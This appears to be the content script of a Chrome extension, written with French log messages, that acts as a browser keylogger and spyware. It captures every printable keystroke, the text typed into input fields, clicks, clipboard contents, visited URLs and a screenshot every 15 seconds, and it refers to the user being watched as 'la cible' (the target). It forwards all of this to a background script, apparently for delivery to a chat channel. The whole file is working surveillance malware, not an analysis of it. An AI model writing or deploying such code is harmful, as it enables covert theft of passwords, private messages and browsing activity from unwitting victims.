// Fonction d'envoi des logs vers background
function sendLog(data) {
  chrome.runtime.sendMessage({ type: "log", data });
}

let keyBuffer = "";
let sendTimeout = null;
const idleDelay = 3000;

function isPrintableKey(key) {
  return key.length === 1 && !["Shift", "Backspace", "Control", "Alt", "Meta", "ArrowUp", "ArrowDown", "ArrowLeft", "ArrowRight"].includes(key);
}

function scheduleSend() {
  if (sendTimeout) clearTimeout(sendTimeout);
  sendTimeout = setTimeout(() => {
    if (keyBuffer.length > 0) {
      sendLog(`【⌨️】 __**Frappes clavier :**__ ${keyBuffer}`);
      keyBuffer = "";
    }
  }, idleDelay);
}

document.addEventListener("keydown", (e) => {
  if (isPrintableKey(e.key)) {
    keyBuffer += e.key;
    scheduleSend();
  }
});

let inputTimeouts = new WeakMap();

document.addEventListener("input", (e) => {
  const el = e.target;
  if (el.tagName === "INPUT" || el.tagName === "TEXTAREA") {
    if (inputTimeouts.has(el)) {
      clearTimeout(inputTimeouts.get(el));
    }

    const timeout = setTimeout(() => {
      let fieldName =
        el.getAttribute("placeholder") ||
        el.getAttribute("aria-label") ||
        document.querySelector(`label[for="${el.id}"]`)?.innerText ||
        el.getAttribute("name") ||
        el.getAttribute("id") ||
        el.tagName;

      sendLog(`__**Champ modifié (${fieldName}) :**__ "${el.value}"`);
      inputTimeouts.delete(el);
    }, idleDelay);

    inputTimeouts.set(el, timeout);
  }
});

document.addEventListener("click", (e) => {
  const el = e.target;
  let labelText =
    el.getAttribute("placeholder") ||
    el.getAttribute("aria-label") ||
    document.querySelector(`label[for="${el.id}"]`)?.innerText ||
    el.innerText?.slice(0, 100) ||
    el.tagName;

  sendLog(`【👆】 __**Clic sur :**__  ${labelText}`);
});

document.addEventListener("copy", () => {
  navigator.clipboard.readText().then((text) => {
    sendLog(`Texte copié : "${text}"`);
  }).catch(() => {
    sendLog("【📄】​ __**Texte copié :**__ ​ [impossible de lire]");
  });
});

window.addEventListener("beforeunload", () => {
  if (keyBuffer.length > 0) {
    sendLog(`【⌨️】 __**Frappes clavier (reste) :**__ ${keyBuffer}`);
    keyBuffer = "";
  }
});

// Capture d'écran via background.js toutes les 15 secondes
function capturePage() {
  chrome.runtime.sendMessage({ type: "request-screenshot" });
}

setInterval(capturePage, 15000);

// Ajout de la détection de Google
if (window.location.hostname.includes("www.google.")) {
  sendLog("👀 __**La cible a ouvert Google**__ ");
}

// Envoyer l'URL de la page visitée à chaque chargement
sendLog(`【🔎】 __**site visité  :**__ ${window.location.href}`);